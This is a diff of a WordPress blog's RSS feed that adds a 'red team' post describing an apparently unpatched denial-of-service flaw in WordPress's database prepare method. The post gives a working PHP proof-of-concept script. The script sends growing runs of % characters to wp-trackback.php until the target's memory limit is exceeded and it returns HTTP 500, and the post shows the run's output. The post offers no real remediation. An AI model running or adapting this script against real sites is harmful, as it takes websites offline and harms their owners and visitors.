@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/category/red-team/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description>// Silence is golden.  Not for you!</description>
-	<lastBuildDate>Sun, 11 Oct 2020 21:30:32 +0000</lastBuildDate>
+	<lastBuildDate>Wed, 02 Dec 2020 23:25:03 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,136 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.5.3</generator>
 	<item>
+		<title>WordPress DB prepare method DOS / memory limit</title>
+		<link>https://wpdeeply.com/wordpress-db-prepare-method-dos-memory-limit/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Wed, 02 Dec 2020 23:20:15 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=94</guid>
+
+					<description><![CDATA[Few years back WP &#8220;fixed&#8221; prepare method of its DB class and even today it remains one of the failure points for ~40% of the web. What is the bug? Simple, because sprintf usage every % sign is replaced with placeholder which in most of the setups swaps 1 character % with 66 in memory. &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-db-prepare-method-dos-memory-limit/"> <span class="screen-reader-text">WordPress DB prepare method DOS / memory limit</span> Read More &#187;</a></p>]]></description>
+										<content:encoded><![CDATA[
+<p>Few years back WP &#8220;fixed&#8221; prepare method of its DB class and even today it remains one of the failure points for ~40% of the web. What is the bug? Simple, because sprintf usage every % sign is replaced with placeholder</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$algo = function_exists( 'hash' ) ? 'sha256' : 'sha1';
+// Old WP installs may not have AUTH_SALT defined.
+$salt = defined( 'AUTH_SALT' ) &amp;&amp; AUTH_SALT ? AUTH_SALT : (string) rand();
+
+$placeholder = '{' . hash_hmac( $algo, uniqid( $salt, true ), $salt ) . '}';
+</code></pre>
+
+
+
+<p>which in most of the setups swaps 1 character % with 66 in memory. Easy DoS, for every routine that calls $wpdb-&gt;prepare or esc_sql <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-db-prepare-dos.md#eli5-poc"></a></h2>
+
+
+
+<h2>Eli5 PoC</h2>
+
+
+
+<p>This attack would work on every $wpdb-&gt;prepare usage like comments or any another data manipulation around WP, but this sample is for wp-trackback.php</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">//post id with turned on trackback
+$post_id = 3;
+//trackback url 
+$target_url = "https://wp.local/wp-trackback.php/".$post_id;
+//number of % bytes to increase on every step
+$payload_step_increase = 100000;
+
+$ch = curl_init();
+$is_500 = false;
+$cnt = 0;
+$payload = "";
+
+while ( ! $is_500 ){
+    
+    $payload = str_repeat("%", ( ( $cnt + 1 ) * $payload_step_increase ) );
+    
+    curl_setopt( $ch, CURLOPT_URL, $target_url );
+    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
+    curl_setopt( $ch, CURLOPT_HEADER, true ); 
+    curl_setopt( $ch, CURLOPT_POST, 1 );
+    curl_setopt( $ch, CURLOPT_POSTFIELDS, "url=".$payload."&amp;title=title&amp;blog_name=blog_name" );
+    
+    $response = curl_exec( $ch );
+    
+    if ( ! curl_errno( $ch ) ){
+        $response_http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
+        if ( $response_http_code >= 500 ){
+            echo ($cnt+1)." * ".$payload_step_increase." % caused 500+ on ".$target_url."\n";
+            echo "Check content of headers-body-500.txt for response data\n";
+            @file_put_contents( "headers-body-500.txt", $response );
+            $is_500 = true;
+        }else{
+            echo ($cnt+1)." step returned ".$response_http_code." http response code\n";
+        }
+    }
+    
+    $cnt++;
+    curl_reset( $ch );
+
+}
+
+curl_close( $ch );
+
+</code></pre>
+
+
+
+<p>on my default setup memory_limit was reached on 5th try</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">1 step returned 409 http response code
+2 step returned 409 http response code
+3 step returned 409 http response code
+4 step returned 409 http response code
+5 * 100000 % caused 500+ on http://wp.local/wp-trackback.php/3
+Check content of headers-body-500.txt for response data
+</code></pre>
+
+
+
+<p>where memory_limit is 128M and post_max_size is 8M.</p>
+
+
+
+<h2>Few facts</h2>
+
+
+
+<ul><li>if only one prepare / esc_sql occurs during code execution memory_limit should be bigger than 66 * post_max_size</li><li>there are cases for popular plugins and wp core where user/visitor input would cause permanent http 500 status code in the wp admin</li><li>How will react server with 60GB of RAM where 100 PHP &#8220;workers&#8221; with 1GB memory_limit exist in pool?  </li></ul>
+
+
+
+<h2>Remediation</h2>
+
+
+
+<ul><li>Good luck and don&#8217;t allow your servers to be melt down by RPi <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress security testing</title>
 		<link>https://wpdeeply.com/wordpress-security-testing/</link>
 		
